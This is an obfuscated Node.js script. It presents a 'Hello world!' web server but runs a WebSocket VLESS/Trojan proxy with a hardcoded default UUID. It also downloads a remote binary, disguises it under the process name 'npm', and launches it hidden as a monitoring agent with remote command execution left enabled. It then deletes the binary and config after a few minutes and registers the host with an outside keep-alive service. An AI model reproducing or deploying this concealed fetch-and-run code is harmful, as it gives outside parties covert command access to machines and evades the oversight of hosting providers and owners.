const _0x4ad5ed=_0xcdb7;(function(_0x4cfd52,_0x4711fb){const _0x97aa57=_0xcdb7,_0x54689e=_0x4cfd52();while(!![]){try{const _0x14c983=parseInt(_0x97aa57(0x177))/0x1+parseInt(_0x97aa57(0x19e))/0x2+parseInt(_0x97aa57(0x137))/0x3*(parseInt(_0x97aa57(0x1a8))/0x4)+-parseInt(_0x97aa57(0x151))/0x5+-parseInt(_0x97aa57(0x1a0))/0x6+parseInt(_0x97aa57(0x1a5))/0x7*(parseInt(_0x97aa57(0x171))/0x8)+-parseInt(_0x97aa57(0x193))/0x9;if(_0x14c983===_0x4711fb)break;else _0x54689e['push'](_0x54689e['shift']());}catch(_0x16ec4c){_0x54689e['push'](_0x54689e['shift']());}}}(_0xa792,0x7196c));function _0xa792(){const _0xaa4d6b=['config.yaml','path','env','utf8','slice','once','readFile','error','length','text/plain','replace',':443?security=tls&sni=','hex','73256vltyuX','npm\x20download\x20successfully','edisonhu.de5.net','catch','Failed\x20to\x20resolve\x20','Unknown','391125MgykAq','NEZHA_PORT','UUID','sha224','2083','digest','close','Server','2096','true','connect','update','https://arm64.ssss.nyc.mn/agent','net','https://amd64.ssss.nyc.mn/v1','application/json','concat','client_secret:\x20','pipe','unlink','arm','https://','createServer',':443?encryption=none&security=tls&sni=','axios','error:\x20','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','readUInt16BE','4101516lDfnvl','decode','2053','Hello\x20world!','trim','url','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','type','crypto','listen','PORT','1234358BTNJuB','pop','2430390KbWyuW','reduce','https://oooo.serv00.net/add-url','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','join','553FTtdaJ','NEZHA\x20variable\x20is\x20empty,\x20skip\x20running','vps','15508gfRpfV','test','vless://','\x20with\x20all\x20DNS\x20servers','&fp=chrome&type=ws&host=','end','get','connection','393YeUoZv','WSPATH','then','aarch64','Hug','trojan://','https://speed.cloudflare.com/meta','split','log','443','Answer','setsid\x20nohup\x20./npm\x20-s\x20','readUInt8','child_process','NEZHA_SERVER','write','from','utf-8','https://arm64.ssss.nyc.mn/v1','every','post','includes','finish','toString','writeHead','npm','4567725ztQcLN','--tls','Not\x20Found\x0a','8.8.4.4','false','&path=%2F','NEZHA_KEY','AUTO_ACCESS','https://amd64.ssss.nyc.mn/agent','stream','715abf30-2577-8d99-6d76-8d60cea59ab5','Status','createHash','data','8443','text/html','map','DOMAIN','createWriteStream'];_0xa792=function(){return _0xaa4d6b;};return _0xa792();}const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x4ad5ed(0x18f)),net=require(_0x4ad5ed(0x184)),path=require(_0x4ad5ed(0x165)),crypto=require(_0x4ad5ed(0x19b)),{Buffer}=require('buffer'),{exec,execSync}=require(_0x4ad5ed(0x144)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x4ad5ed(0x166)][_0x4ad5ed(0x179)]||_0x4ad5ed(0x15b),NEZHA_SERVER=process[_0x4ad5ed(0x166)][_0x4ad5ed(0x145)]||'',NEZHA_PORT=process[_0x4ad5ed(0x166)][_0x4ad5ed(0x178)]||'',NEZHA_KEY=process[_0x4ad5ed(0x166)][_0x4ad5ed(0x157)]||'',DOMAIN=process[_0x4ad5ed(0x166)][_0x4ad5ed(0x162)]||_0x4ad5ed(0x173),AUTO_ACCESS=process[_0x4ad5ed(0x166)][_0x4ad5ed(0x158)]||!![],WSPATH=process['env'][_0x4ad5ed(0x138)]||UUID[_0x4ad5ed(0x168)](0x0,0x8),SUB_PATH=process[_0x4ad5ed(0x166)]['SUB_PATH']||_0x4ad5ed(0x1a7),NAME=process[_0x4ad5ed(0x166)]['NAME']||_0x4ad5ed(0x13b),PORT=process[_0x4ad5ed(0x166)][_0x4ad5ed(0x19d)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x3c3ef0=_0x4ad5ed;try{const _0x1fbea4=await axios[_0x3c3ef0(0x135)](_0x3c3ef0(0x13d)),_0x1acadd=_0x1fbea4[_0x3c3ef0(0x15e)];ISP=(_0x1acadd['country']+'-'+_0x1acadd['asOrganization'])[_0x3c3ef0(0x16e)](/ /g,'_');}catch(_0xc51fe0){ISP=_0x3c3ef0(0x176);}};GetISP();const httpServer=http[_0x4ad5ed(0x18d)]((_0x233b71,_0x1fb704)=>{const _0xe794b6=_0x4ad5ed;if(_0x233b71['url']==='/'){const _0x17e05d=path['join'](__dirname,'index.html');fs[_0xe794b6(0x16a)](_0x17e05d,_0xe794b6(0x167),(_0x517dcc,_0x2235c9)=>{const _0x5e0413=_0xe794b6;if(_0x517dcc){_0x1fb704['writeHead'](0xc8,{'Content-Type':_0x5e0413(0x160)}),_0x1fb704[_0x5e0413(0x134)](_0x5e0413(0x196));return;}_0x1fb704['writeHead'](0xc8,{'Content-Type':_0x5e0413(0x160)}),_0x1fb704[_0x5e0413(0x134)](_0x2235c9);});return;}else{if(_0x233b71['url']==='/'+SUB_PATH){const _0x5e3d36=_0xe794b6(0x1aa)+UUID+'@'+DOMAIN+_0xe794b6(0x18e)+DOMAIN+_0xe794b6(0x133)+DOMAIN+_0xe794b6(0x156)+WSPATH+'#'+NAME+'-'+ISP,_0x53f270=_0xe794b6(0x13c)+UUID+'@'+DOMAIN+_0xe794b6(0x16f)+DOMAIN+_0xe794b6(0x133)+DOMAIN+_0xe794b6(0x156)+WSPATH+'#'+NAME+'-'+ISP,_0x4369ea=_0x5e3d36+'\x0a'+_0x53f270,_0x5c8ba4=Buffer[_0xe794b6(0x147)](_0x4369ea)[_0xe794b6(0x14e)]('base64');_0x1fb704[_0xe794b6(0x14f)](0xc8,{'Content-Type':_0xe794b6(0x16d)}),_0x1fb704[_0xe794b6(0x134)](_0x5c8ba4+'\x0a');}else _0x1fb704[_0xe794b6(0x14f)](0x194,{'Content-Type':_0xe794b6(0x16d)}),_0x1fb704[_0xe794b6(0x134)](_0xe794b6(0x153));}}),wss=new WebSocket[(_0x4ad5ed(0x17e))]({'server':httpServer}),uuid=UUID['replace'](/-/g,''),DNS_SERVERS=[_0x4ad5ed(0x154),'1.1.1.1'];function resolveHost(_0x2333b5){return new Promise((_0x368847,_0x16ea2c)=>{const _0x255c70=_0xcdb7;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x255c70(0x1a9)](_0x2333b5)){_0x368847(_0x2333b5);return;}let _0x166110=0x0;function _0x21c580(){const _0x41ca74=_0x255c70;if(_0x166110>=DNS_SERVERS[_0x41ca74(0x16c)]){_0x16ea2c(new Error(_0x41ca74(0x175)+_0x2333b5+_0x41ca74(0x132)));return;}const _0x97ec66=DNS_SERVERS[_0x166110];_0x166110++;const _0x465452='https://dns.google/resolve?name='+encodeURIComponent(_0x2333b5)+'&type=A';axios[_0x41ca74(0x135)](_0x465452,{'timeout':0x1388,'headers':{'Accept':'application/dns-json'}})[_0x41ca74(0x139)](_0x3a4e67=>{const _0x55af95=_0x41ca74,_0x43bdeb=_0x3a4e67['data'];if(_0x43bdeb[_0x55af95(0x15c)]===0x0&&_0x43bdeb[_0x55af95(0x141)]&&_0x43bdeb[_0x55af95(0x141)]['length']>0x0){const _0x17aca1=_0x43bdeb[_0x55af95(0x141)]['find'](_0x343130=>_0x343130[_0x55af95(0x19a)]===0x1);if(_0x17aca1){_0x368847(_0x17aca1[_0x55af95(0x15e)]);return;}}_0x21c580();})[_0x41ca74(0x174)](_0x1268c6=>{_0x21c580();});}_0x21c580();});}function handleVlessConnection(_0x4088d1,_0x3076e1){const _0x551768=_0x4ad5ed,[_0x2725fd]=_0x3076e1,_0x48b751=_0x3076e1['slice'](0x1,0x11);if(!_0x48b751[_0x551768(0x14a)]((_0x3597fa,_0xf81744)=>_0x3597fa==parseInt(uuid['substr'](_0xf81744*0x2,0x2),0x10)))return![];let _0x4c3f52=_0x3076e1[_0x551768(0x168)](0x11,0x12)[_0x551768(0x143)]()+0x13;const _0x37d679=_0x3076e1['slice'](_0x4c3f52,_0x4c3f52+=0x2)[_0x551768(0x192)](0x0),_0x311e6f=_0x3076e1[_0x551768(0x168)](_0x4c3f52,_0x4c3f52+=0x1)[_0x551768(0x143)](),_0x4e2421=_0x311e6f==0x1?_0x3076e1[_0x551768(0x168)](_0x4c3f52,_0x4c3f52+=0x4)['join']('.'):_0x311e6f==0x2?new TextDecoder()[_0x551768(0x194)](_0x3076e1[_0x551768(0x168)](_0x4c3f52+0x1,_0x4c3f52+=0x1+_0x3076e1[_0x551768(0x168)](_0x4c3f52,_0x4c3f52+0x1)[_0x551768(0x143)]())):_0x311e6f==0x3?_0x3076e1[_0x551768(0x168)](_0x4c3f52,_0x4c3f52+=0x10)[_0x551768(0x1a1)]((_0x76f542,_0x5803a9,_0x920a2b,_0x9d2c9c)=>_0x920a2b%0x2?_0x76f542[_0x551768(0x187)](_0x9d2c9c[_0x551768(0x168)](_0x920a2b-0x1,_0x920a2b+0x1)):_0x76f542,[])[_0x551768(0x161)](_0x50dde2=>_0x50dde2[_0x551768(0x192)](0x0)[_0x551768(0x14e)](0x10))[_0x551768(0x1a4)](':'):'';_0x4088d1['send'](new Uint8Array([_0x2725fd,0x0]));const _0x1eeeea=createWebSocketStream(_0x4088d1);return resolveHost(_0x4e2421)[_0x551768(0x139)](_0x47e4f7=>{const _0x5443e9=_0x551768;net[_0x5443e9(0x181)]({'host':_0x47e4f7,'port':_0x37d679},function(){const _0x4a8805=_0x5443e9;this[_0x4a8805(0x146)](_0x3076e1[_0x4a8805(0x168)](_0x4c3f52)),_0x1eeeea['on'](_0x4a8805(0x16b),()=>{})[_0x4a8805(0x189)](this)['on'](_0x4a8805(0x16b),()=>{})['pipe'](_0x1eeeea);})['on']('error',()=>{});})[_0x551768(0x174)](_0x3785d0=>{const _0x4ad0d7=_0x551768;net[_0x4ad0d7(0x181)]({'host':_0x4e2421,'port':_0x37d679},function(){const _0xaca9ac=_0x4ad0d7;this['write'](_0x3076e1['slice'](_0x4c3f52)),_0x1eeeea['on'](_0xaca9ac(0x16b),()=>{})['pipe'](this)['on']('error',()=>{})['pipe'](_0x1eeeea);})['on'](_0x4ad0d7(0x16b),()=>{});}),!![];}function _0xcdb7(_0x52be5b,_0x12d9c3){_0x52be5b=_0x52be5b-0x132;const _0xa79253=_0xa792();let _0xcdb7a9=_0xa79253[_0x52be5b];return _0xcdb7a9;}function handleTrojanConnection(_0x52e3f4,_0x420ab8){const _0x4dc393=_0x4ad5ed;try{if(_0x420ab8['length']<0x3a)return![];const _0x488e29=_0x420ab8['slice'](0x0,0x38)[_0x4dc393(0x14e)](),_0x34ef4=[UUID];let _0x15b34b=null;for(const _0x597f79 of _0x34ef4){const _0x1212ce=crypto[_0x4dc393(0x15d)](_0x4dc393(0x17a))[_0x4dc393(0x182)](_0x597f79)[_0x4dc393(0x17c)](_0x4dc393(0x170));if(_0x1212ce===_0x488e29){_0x15b34b=_0x597f79;break;}}if(!_0x15b34b)return![];let _0x2b4b2a=0x38;_0x420ab8[_0x2b4b2a]===0xd&&_0x420ab8[_0x2b4b2a+0x1]===0xa&&(_0x2b4b2a+=0x2);const _0x17490d=_0x420ab8[_0x2b4b2a];if(_0x17490d!==0x1)return![];_0x2b4b2a+=0x1;const _0x26990a=_0x420ab8[_0x2b4b2a];_0x2b4b2a+=0x1;let _0x36e32a,_0x3c1f86;if(_0x26990a===0x1)_0x36e32a=_0x420ab8[_0x4dc393(0x168)](_0x2b4b2a,_0x2b4b2a+0x4)[_0x4dc393(0x1a4)]('.'),_0x2b4b2a+=0x4;else{if(_0x26990a===0x3){const _0xa199be=_0x420ab8[_0x2b4b2a];_0x2b4b2a+=0x1,_0x36e32a=_0x420ab8[_0x4dc393(0x168)](_0x2b4b2a,_0x2b4b2a+_0xa199be)[_0x4dc393(0x14e)](),_0x2b4b2a+=_0xa199be;}else{if(_0x26990a===0x4)_0x36e32a=_0x420ab8[_0x4dc393(0x168)](_0x2b4b2a,_0x2b4b2a+0x10)[_0x4dc393(0x1a1)]((_0x49aba0,_0x506a81,_0x391631,_0x3ae8ac)=>_0x391631%0x2?_0x49aba0['concat'](_0x3ae8ac[_0x4dc393(0x168)](_0x391631-0x1,_0x391631+0x1)):_0x49aba0,[])['map'](_0x1e8582=>_0x1e8582[_0x4dc393(0x192)](0x0)[_0x4dc393(0x14e)](0x10))[_0x4dc393(0x1a4)](':'),_0x2b4b2a+=0x10;else return![];}}_0x3c1f86=_0x420ab8[_0x4dc393(0x192)](_0x2b4b2a),_0x2b4b2a+=0x2;_0x2b4b2a<_0x420ab8[_0x4dc393(0x16c)]&&_0x420ab8[_0x2b4b2a]===0xd&&_0x420ab8[_0x2b4b2a+0x1]===0xa&&(_0x2b4b2a+=0x2);const _0x1356e6=createWebSocketStream(_0x52e3f4);return resolveHost(_0x36e32a)['then'](_0x2614eb=>{const _0x55c80b=_0x4dc393;net[_0x55c80b(0x181)]({'host':_0x2614eb,'port':_0x3c1f86},function(){const _0x176066=_0x55c80b;_0x2b4b2a<_0x420ab8[_0x176066(0x16c)]&&this[_0x176066(0x146)](_0x420ab8[_0x176066(0x168)](_0x2b4b2a)),_0x1356e6['on']('error',()=>{})[_0x176066(0x189)](this)['on'](_0x176066(0x16b),()=>{})[_0x176066(0x189)](_0x1356e6);})['on'](_0x55c80b(0x16b),()=>{});})[_0x4dc393(0x174)](_0x4f9da9=>{const _0x2dc5db=_0x4dc393;net[_0x2dc5db(0x181)]({'host':_0x36e32a,'port':_0x3c1f86},function(){const _0x39c7e1=_0x2dc5db;_0x2b4b2a<_0x420ab8[_0x39c7e1(0x16c)]&&this[_0x39c7e1(0x146)](_0x420ab8[_0x39c7e1(0x168)](_0x2b4b2a)),_0x1356e6['on'](_0x39c7e1(0x16b),()=>{})[_0x39c7e1(0x189)](this)['on'](_0x39c7e1(0x16b),()=>{})[_0x39c7e1(0x189)](_0x1356e6);})['on']('error',()=>{});}),!![];}catch(_0x395351){return![];}}wss['on'](_0x4ad5ed(0x136),(_0x277170,_0x25c196)=>{const _0x4eff02=_0x4ad5ed,_0x2c4443=_0x25c196[_0x4eff02(0x198)]||'';_0x277170[_0x4eff02(0x169)]('message',_0x8c49ec=>{const _0x7379b3=_0x4eff02;if(_0x8c49ec[_0x7379b3(0x16c)]>0x11&&_0x8c49ec[0x0]===0x0){const _0x2f1bd7=_0x8c49ec[_0x7379b3(0x168)](0x1,0x11),_0x78df6b=_0x2f1bd7['every']((_0x5b8f7d,_0x19b844)=>_0x5b8f7d==parseInt(uuid['substr'](_0x19b844*0x2,0x2),0x10));if(_0x78df6b){!handleVlessConnection(_0x277170,_0x8c49ec)&&_0x277170[_0x7379b3(0x17d)]();return;}}!handleTrojanConnection(_0x277170,_0x8c49ec)&&_0x277170[_0x7379b3(0x17d)]();})['on'](_0x4eff02(0x16b),()=>{});});const getDownloadUrl=()=>{const _0x4c0bde=_0x4ad5ed,_0x3f74a0=os['arch']();return _0x3f74a0===_0x4c0bde(0x18b)||_0x3f74a0==='arm64'||_0x3f74a0===_0x4c0bde(0x13a)?!NEZHA_PORT?_0x4c0bde(0x149):_0x4c0bde(0x183):!NEZHA_PORT?_0x4c0bde(0x185):_0x4c0bde(0x159);},downloadFile=async()=>{const _0x2f7a57=_0x4ad5ed;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x566805=getDownloadUrl(),_0x583c6d=await axios({'method':_0x2f7a57(0x135),'url':_0x566805,'responseType':_0x2f7a57(0x15a)}),_0x4e975c=fs[_0x2f7a57(0x163)](_0x2f7a57(0x150));return _0x583c6d[_0x2f7a57(0x15e)]['pipe'](_0x4e975c),new Promise((_0x56a6cd,_0x4eafd9)=>{const _0x56018f=_0x2f7a57;_0x4e975c['on'](_0x56018f(0x14d),()=>{const _0x4f483e=_0x56018f;console[_0x4f483e(0x13f)](_0x4f483e(0x172)),exec('chmod\x20+x\x20npm',_0x48b4ff=>{if(_0x48b4ff)_0x4eafd9(_0x48b4ff);_0x56a6cd();});}),_0x4e975c['on'](_0x56018f(0x16b),_0x4eafd9);});}catch(_0x491431){throw _0x491431;}},runnz=async()=>{const _0x2ca71f=_0x4ad5ed;try{const _0x3de814=execSync('ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22',{'encoding':_0x2ca71f(0x148)});if(_0x3de814[_0x2ca71f(0x197)]()!==''){console[_0x2ca71f(0x13f)]('npm\x20is\x20already\x20running,\x20skip\x20running...');return;}}catch(_0x3083c5){}await downloadFile();let _0x3a21f8='',_0x400b48=[_0x2ca71f(0x140),_0x2ca71f(0x15f),_0x2ca71f(0x17f),'2087',_0x2ca71f(0x17b),_0x2ca71f(0x195)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5ea972=_0x400b48['includes'](NEZHA_PORT)?_0x2ca71f(0x152):'';_0x3a21f8=_0x2ca71f(0x142)+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5ea972+'\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&';}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x2ab2bb=NEZHA_SERVER['includes'](':')?NEZHA_SERVER[_0x2ca71f(0x13e)](':')[_0x2ca71f(0x19f)]():'',_0x4101fd=_0x400b48[_0x2ca71f(0x14c)](_0x2ab2bb)?_0x2ca71f(0x180):_0x2ca71f(0x155),_0x465ccd=_0x2ca71f(0x188)+NEZHA_KEY+_0x2ca71f(0x1a3)+NEZHA_SERVER+'\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20'+_0x4101fd+_0x2ca71f(0x199)+UUID;fs['writeFileSync'](_0x2ca71f(0x164),_0x465ccd);}_0x3a21f8=_0x2ca71f(0x191);}else{console[_0x2ca71f(0x13f)](_0x2ca71f(0x1a6));return;}}try{exec(_0x3a21f8,{'shell':'/bin/bash'},_0x575c5d=>{const _0x60ed3d=_0x2ca71f;if(_0x575c5d)console[_0x60ed3d(0x16b)]('npm\x20running\x20error:',_0x575c5d);else console[_0x60ed3d(0x13f)]('npm\x20is\x20running');});}catch(_0xa3a335){console[_0x2ca71f(0x16b)](_0x2ca71f(0x190)+_0xa3a335);}};async function addAccessTask(){const _0x376ab1=_0x4ad5ed;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x4d883b=_0x376ab1(0x18c)+DOMAIN;try{const _0xc96df1=await axios[_0x376ab1(0x14b)](_0x376ab1(0x1a2),{'url':_0x4d883b},{'headers':{'Content-Type':_0x376ab1(0x186)}});console[_0x376ab1(0x13f)]('Automatic\x20Access\x20Task\x20added\x20successfully');}catch(_0x35f9d5){}}const delFiles=()=>{const _0x196be8=_0x4ad5ed;fs[_0x196be8(0x18a)](_0x196be8(0x150),()=>{}),fs[_0x196be8(0x18a)](_0x196be8(0x164),()=>{});};httpServer[_0x4ad5ed(0x19c)](PORT,()=>{const _0x3e968d=_0x4ad5ed;runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console[_0x3e968d(0x13f)]('Server\x20is\x20running\x20on\x20port\x20'+PORT);});